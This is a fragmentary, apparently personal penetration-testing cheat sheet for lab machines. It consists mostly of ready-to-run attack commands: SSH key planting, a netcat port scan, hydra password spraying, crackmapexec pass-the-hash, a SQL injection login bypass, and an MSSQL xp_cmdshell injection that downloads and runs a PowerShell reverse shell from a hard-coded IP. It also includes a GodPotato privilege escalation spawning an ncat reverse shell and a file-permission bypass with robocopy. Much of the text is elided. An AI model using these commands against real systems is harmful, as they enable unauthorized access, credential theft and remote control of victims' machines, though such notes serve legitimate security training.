...
Blatantly stolen from https://github.com/LeonardoE95 - check his youtube out, good stuff
...
* Fake files
If you need some fake files you can find them here:
#+begin_example
...
* Problems and fixes
** SSH
SSH might throw an error like this: 
Received disconnect from 127.0.0.1 port 22:2: Too many authentication failures
Disconnected from 127.0.0.1 port 22

Use this to fix (https://www.tecmint.com/fix-ssh-too-many-authentication-failures-error/), PG box boolean:
#+begin_example
...
Use this to generate a ssh key pair in order to authenticate to target
#+begin_example
ssh-keygen -q -N '' -t rsa 
#+end_example
Rename the .pub keyfile to authorized_keys and upload to target .ssh folder.
Use the private key to authenticate without password.
...
for port in {4800..4900}; do proxychains nc -zv -w1 IP $port 2>&1 | grep OK; done (Bash script to scan port range with netcat)
   #+end_example
...
hydra -L users.txt -p "SuperS3cure1337#" rdp://192.168.247.202
   ...
   Password spraying on http-get form
   #+begin_example
...
*** Files, services and History 
    search files recursively on Windows
    #+begin_example
...
Windows kernel exploit library
  #+begin_example
...
proxychains crackmapexec smb IP1 IP2 -u USERNAME -H NTLM-HAHSH --shares
   ...
   Dump hashes from SAM and SYSTEM hives locally
   #+begin_example
...
username=' UNION SELECT 'nurhodelta','password','c','d','f','a','a' -- &password=password&login=
    ...
    Write webshell to server using SQLi union select (works for MySQL)
    #+begin_example
...
' ; EXEC xp_cmdshell 'powershell -c "iex(new-object net.webclient).downloadstring(\"http://192.168.45.248:1337/Invoke-PowerShellTcp.ps1\")" '; --
   ...
   ---------------
Upload php reverse shell uploader to Windows machine using authenticated phpmyadmin
	#+begin_example
https://gist.github.com/BababaBlue/71d85a7182993f6b4728c5d6a77e669f
	#+end_example


Get More privileges with local service account
	#+begin_example
...
./GodPotato-NET35.exe -cmd "C:\TEMP\ncat.exe 192.168.45.235 5555 -e cmd"n
   ...
   Use robocopy
   #+begin_example
   robocopy /b C:\Windows\veryimportantadminuser\Desktop\ .\adminsDesktop   - do not forget the /b mode to override file and folder permissions
   #+end_example
...
Reverse shell commands not working problem fix (e.g. whoami not found etc.)
#+begin_example
